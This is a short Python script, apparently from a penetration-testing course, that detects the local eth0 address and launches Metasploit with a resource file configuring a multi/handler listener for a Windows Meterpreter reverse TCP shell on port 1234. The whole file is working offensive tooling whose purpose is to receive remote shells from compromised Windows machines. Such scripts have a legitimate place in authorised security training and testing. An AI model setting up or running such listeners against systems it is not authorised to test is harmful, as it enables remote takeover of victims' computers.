#!/usr/bin/env python3

# Script:                   Python Metasploit
# Author:                   Courtney Hans
# Date of latest revision:  11/3/20
# Purpose:                  Python meterpreter

# Import libraries
import os, sys
import netifaces as ni # can install with 'pip install netifaces'

# Declare variables

ni.ifaddresses('eth0')
ipAddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
print("Just a moment...\nLaunching Metasploit and assigning " + ipAddr + " as listening host...")

# Declare functions

def establish(metafile):
	metafile.write('use exploit/multi/handler\n')
	metafile.write('set payload windows/meterpreter/reverse_tcp\n')
	metafile.write('set LHOST ' + ipAddr + '\n') # listening host
	metafile.write('set LPORT 1234\n') # set port 1234 as the listener 
	metafile.write('run\n')

# Main

metafile=open('meta.rc','w')
establish(metafile)
metafile.close()
os.system('msfconsole -r meta.rc')

# End
